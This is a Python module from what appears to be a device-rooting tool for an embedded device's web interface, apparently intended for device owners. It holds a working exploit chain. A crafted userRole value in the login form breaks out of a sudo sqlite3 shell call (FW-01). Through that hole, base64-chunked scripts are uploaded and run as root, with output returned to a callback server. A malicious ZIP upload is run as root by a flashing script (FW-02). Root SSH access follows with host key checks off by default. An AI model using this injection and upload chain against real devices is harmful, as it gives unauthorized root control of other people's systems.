"""Transports for FW-01 (login injection), FW-02 (ESP ZIP) and SSH."""

from __future__ import annotations

import base64
import shutil
import socket
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

from .errors import PreconditionError, TransportError, VerificationError
from .httpclient import HTTPClient
from .callback import CallbackServer
from .payloads import capture_script, inspect_zip

WEB_CHUNK = 40000


def _quote_injection(command: str) -> str:
    """Build the ``userRole`` value that closes the SQL quote and runs ``command``.

    ``login.php`` passes ``userRole`` into::

        sudo /usr/bin/sqlite3 ... -separator ";" '$query'

    so ``';`` ends the shell quote, ``#`` comments out the trailing SQL.
    """
    if "\x00" in command:
        raise TransportError("injected command contains a NUL byte")
    return "x';" + command + ";#"


@dataclass
class InjectionResult:
    status: int
    url: str
    body_bytes: int
    command: str


class WebTransport:
    """FW-01: execute a root script through the login form."""

    def __init__(self, client: HTTPClient, chunk_size: int = WEB_CHUNK) -> None:
        if chunk_size < 512:
            raise TransportError("web chunk size is too small")
        self.client = client
        self.chunk_size = chunk_size

    def inject(self, command: str, tolerate_timeout: bool = False) -> InjectionResult:
        fields = {
            "login": "1",
            "requestDeveloper": "1",
            "password": "x",
            "userRole": _quote_injection(command),
        }
        try:
            response = self.client.post_form("/login.php", fields)
        except TransportError as exc:
            # login.php runs the injected command synchronously.  A long
            # command (or a slow device) can outlive the HTTP read timeout even
            # though the command has already started.  Only the final execute
            # call may opt in: the callback is then the success signal, and a
            # missing callback still fails closed.
            if tolerate_timeout and "timed out" in str(exc).lower():
                return InjectionResult(
                    status=0,
                    url=self.client.url("/login.php"),
                    body_bytes=0,
                    command=command,
                )
            raise
        if response.status >= 500:
            raise TransportError(
                f"login.php returned HTTP {response.status}: {response.text[:200]!r}"
            )
        return InjectionResult(
            status=response.status,
            url=response.url,
            body_bytes=len(response.body),
            command=command,
        )

    def run_script(self, script: str) -> int:
        """Upload a shell script in bounded chunks and execute it as root."""
        encoded = base64.b64encode(script.encode()).decode()
        self.inject("sudo rm -f /tmp/e64root-web.b64 /tmp/e64root-web.sh")
        for offset in range(0, len(encoded), self.chunk_size):
            chunk = encoded[offset : offset + self.chunk_size]
            self.inject(f"printf '%s' '{chunk}' >> /tmp/e64root-web.b64")
        self.inject(
            "base64 -d /tmp/e64root-web.b64 > /tmp/e64root-web.sh && "
            "chmod 700 /tmp/e64root-web.sh && sudo sh /tmp/e64root-web.sh",
            tolerate_timeout=True,
        )
        return 2 + (len(encoded) + self.chunk_size - 1) // self.chunk_size

    def run_capture(self, script: str, callback: CallbackServer, timeout: float = 60.0) -> str:
        """Run a read-only script and return its stdout via the callback."""
        self.run_script(capture_script(script, callback.url))
        return callback.wait(timeout).body.decode("utf-8", errors="replace")


class EspTransport:
    """FW-02: upload a ZIP that ``flashEspZip.sh`` executes as root."""

    def __init__(self, client: HTTPClient) -> None:
        self.client = client

    def upload(self, payload: bytes) -> str:
        if not payload:
            raise TransportError("refusing to upload an empty archive")
        members = inspect_zip(payload)
        if not members:
            raise TransportError("refusing to upload an empty archive")
        response = self.client.post_multipart(
            "/upload_esp.php",
            "espFile",
            "payload.zip",
            payload,
            content_type="application/zip",
        )
        text = response.text
        if response.status != 200:
            raise TransportError(f"upload_esp.php returned HTTP {response.status}: {text[:300]!r}")
        # The handler emits a stray '@' after the JSON, so substring matching is
        # deliberate.  Error text is still shown to the owner.
        if "Upload successful!" not in text or '"error":false' not in text.replace(" ", ""):
            raise TransportError(f"ESP upload rejected: {text.strip()[:400]}")
        return text


# --- SSH --------------------------------------------------------------------

@dataclass
class SSHResult:
    returncode: int
    stdout: str
    stderr: str


class SSHTransport:
    """Thin, explicit wrapper around the system OpenSSH client.

    No password authentication, no agent forwarding, no remote port forwarding
    and no control socket.  The owner's key must already be installed.
    """

    def __init__(
        self,
        host: str,
        port: int = 22,
        key: str | Path | None = None,
        timeout: float = 20.0,
        strict_host_key: bool = False,
    ) -> None:
        if timeout <= 0:
            raise PreconditionError("SSH timeout must be positive")
        self.host = host
        self.port = port
        self.key = Path(key).expanduser() if key else None
        self.timeout = timeout
        self.strict_host_key = strict_host_key
        self.ssh = shutil.which("ssh")
        if not self.ssh:
            raise PreconditionError("the system has no 'ssh' client on PATH")
        if self.key and not self.key.is_file():
            raise PreconditionError(f"SSH private key not found: {self.key}")

    def _args(self) -> list[str]:
        options = [
            "-o",
            "BatchMode=yes",
            "-o",
            "IdentitiesOnly=yes",
            "-o",
            f"ConnectTimeout={max(1, int(self.timeout))}",
            "-o",
            "ServerAliveInterval=5",
            "-o",
            "ServerAliveCountMax=2",
            "-o",
            "LogLevel=ERROR",
        ]
        if self.key:
            options += ["-i", str(self.key)]
        if not self.strict_host_key:
            options += [
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "GlobalKnownHostsFile=/dev/null",
            ]
        options += ["-p", str(self.port), "-T"]
        return options

    def run(self, script: str) -> SSHResult:
        if not script.strip():
            raise PreconditionError("refusing to run an empty SSH script")
        command = [
            self.ssh,
            *self._args(),
            f"root@{self.host}",
            "sh",
            "-s",
        ]
        try:
            completed = subprocess.run(
                command,
                input=script.encode(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=self.timeout + 10,
                check=False,
            )
        except subprocess.TimeoutExpired as exc:
            raise TransportError(f"SSH command timed out after {self.timeout + 10:.0f}s") from exc
        result = SSHResult(
            completed.returncode,
            completed.stdout.decode("utf-8", errors="replace"),
            completed.stderr.decode("utf-8", errors="replace"),
        )
        if result.returncode == 255:
            raise TransportError(f"SSH transport failed: {result.stderr.strip() or 'no detail'}")
        return result

    def run_or_raise(self, script: str) -> SSHResult:
        result = self.run(script)
        if result.returncode != 0:
            raise TransportError(
                f"remote command exited {result.returncode}: "
                f"{(result.stderr or result.stdout).strip()[:300]}"
            )
        return result

    def wait_ready(self, timeout: float = 60.0, interval: float = 2.0) -> None:
        deadline = time.monotonic() + timeout
        last = ""
        while time.monotonic() < deadline:
            try:
                with socket.create_connection((self.host, self.port), timeout=3):
                    pass
                result = self.run("id -u")
                if result.returncode == 0 and result.stdout.strip() == "0":
                    return
                last = result.stderr.strip() or result.stdout.strip()
            except (OSError, TransportError) as exc:
                last = str(exc)
            time.sleep(interval)
        raise VerificationError(
            f"SSH on {self.host}:{self.port} did not accept the owner key within "
            f"{timeout:.0f}s ({last or 'no detail'})"
        )

    def read_inventory(self, script: str) -> dict[str, str]:
        result = self.run_or_raise(script)
        return parse_kv(result.stdout)


def parse_kv(text: str) -> dict[str, str]:
    values: dict[str, str] = {}
    for line in text.splitlines():
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        key = key.strip()
        if key:
            values[key] = value.strip()
    return values


def parse_callback_uid(body: bytes) -> str:
    """Extract the final ``uid=...`` line (the wrapper's own ``id`` call)."""
    text = body.decode("utf-8", errors="replace")
    matches = [line.strip() for line in text.splitlines() if line.startswith("uid=")]
    if matches:
        return matches[-1]
    raise VerificationError("callback body did not contain a uid= line")


def validate_esp_preconditions(values: dict[str, str]) -> None:
    if values.get("uid") not in (None, "0"):
        raise PreconditionError(f"precondition check ran as uid {values.get('uid')}, not root")
    if values.get("log_www_writable") != "yes":
        raise PreconditionError(
            "www-data cannot write /log "
            f"(mode/owner: {values.get('log_stat', 'unknown')}). "
            "FW-02 fails closed here; use the FW-01 path instead."
        )
    for key, label in (
        ("tty_stm5", "/dev/ttySTM5"),
        ("flash_script", "/usr/local/bin/flashEspZip.sh"),
        ("set_bootmode", "/usr/local/bin/setEspBootmode.sh"),
        ("unset_bootmode", "/usr/local/bin/unsetEspBootmode.sh"),
    ):
        if values.get(key) != "yes":
            raise PreconditionError(f"FW-02 precondition missing: {label}")
